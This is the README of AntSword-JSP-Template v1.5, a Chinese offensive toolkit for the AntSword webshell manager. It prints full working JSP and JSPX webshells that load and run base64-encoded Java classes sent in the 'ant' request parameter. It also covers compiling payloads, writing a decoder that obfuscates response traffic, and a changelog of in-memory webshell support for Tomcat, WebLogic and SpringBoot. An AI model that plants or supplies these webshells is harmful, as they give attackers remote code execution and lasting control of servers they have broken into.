# AntSword-JSP-Template  v1.5

中国蚁剑JSP一句话Payload

详细介绍：https://yzddmr6.tk/posts/antsword-diy-3/

编译环境：jdk1.5 + tomcat5

适用范围：jdk1.5 及以上

## 编译

### 手动编译

* Windows

```
javac.exe -cp "./lib/servlet-api.jar;./lib/jsp-api.jar" Test.java

base64 -w 0 Test.class > Test.txt
```

* Linux/Mac

```bash
javac -cp "./lib/servlet-api.jar:./lib/jsp-api.jar" Test.java

# Linux
base64 -w 0 Test.class > Test.txt

# Mac
base64 -b 0 Test.class > Test.txt
```

### 自动编译

在build.py中替换你的javac路径后运行，即可在`./dist`目录下自动生成代码模板。

```
python build.py
```

编译完成后将`./dist/`目录下所有文件拷贝至`antSword-master/source/core/jsp/template/`下即可

## Shell
shell.jsp

```
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
      Class base64;
      byte[] value = null;
      try {
        base64=Class.forName("sun.misc.BASE64Decoder");
        Object decoder = base64.newInstance();
        value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
      } catch (Exception e) {
        try {
          base64=Class.forName("java.util.Base64");
          Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
          value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
        } catch (Exception ee) {}
      }
      return value;
    }
%>
<%
    String cls = request.getParameter("ant");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

shell.jspx
```
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:declaration>
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }
            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
        public byte[] base64Decode(String str) throws Exception {
            Class base64;
            byte[] value = null;
            try {
                base64=Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
            } catch (Exception e) {
                try {
                    base64=Class.forName("java.util.Base64");
                    Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                    value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
                } catch (Exception ee) {}
            }
            return value;
        }
    </jsp:declaration>
    <jsp:scriptlet>
        String cls = request.getParameter("ant");
        if (cls != null) {
            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
        }
    </jsp:scriptlet>
</jsp:root>
```
其中`pageContext`可以替换为`request`，以实现对内存Webshell的兼容。

## 解码器

以 Reverse 解码器为例说明：

> 该解码器的功能是将返回包的数据反转

1. 编写 `AsoutputReverse.java` 内容如下:

```java
public class AsoutputReverse {
  String res;

  public AsoutputReverse(String str) {
    // 这里编写对 str 处理的逻辑, 最后将值传给 res
    res = new StringBuffer(str).reverse().toString();
  }

  // 请保持 toString 方法, 不要修改内容
  @Override
  public String toString() {
    return res;
  }
}
```

2. 编译，并获取 .class 文件 base64 后的内容

```
$ javac AsoutputReverse.java
$ base64 -w 0 AsoutputReverse.class
```

3. 打开 AntSword 进入编码设置，创建「解码器」，内容如下:

```
/**
 * JSP::reverse 解码器
 */

 'use strict';

 module.exports = {
   asoutput: () => {
     // 这里是你的 .class 文件的 base64 后的内容
     return `yv66vgAAADMAHgoACAATBwAUCgACABUKAAIAFgoAAgAXCQAHABgHA...`;
   },
   decode_buff: (data) => {
     // 这里是解返回包的逻辑
     return Buffer.from(data).reverse();
   }
 }
```


## 更新日志

### v1.5

1. 支持解码器(返回包加密)
2. 修复base64编码问题&改正错别字
3. 修改获取当前目录的方式
4. 兼容 JDK 1.5

### v 1.4

1. 兼容JDK6
2. 兼容weblogic内存webshell
3. 优化报错信息
4. 解决windows下中文乱码的问题（win选择GBK编码，linux选择UTF-8编码）
5. 实战中只能获取到response的情况几乎没有，所以为了减少payload体积不再支持response作为入口参数
6. 增加用于测试payload的Web项目
7. 修复 java -jar xxx.war 启动时当前目录获取失败的问题


### v 1.3

1. 兼容SpringBoot

### v 1.2

1. 修复下载文件的BUG
2. database添加Base64编码

### v 1.1

1. 增加对Tomcat内存Webshell的兼容
2. 兼容高版本JDK（JDK7-14）

### v 1.0

1. release
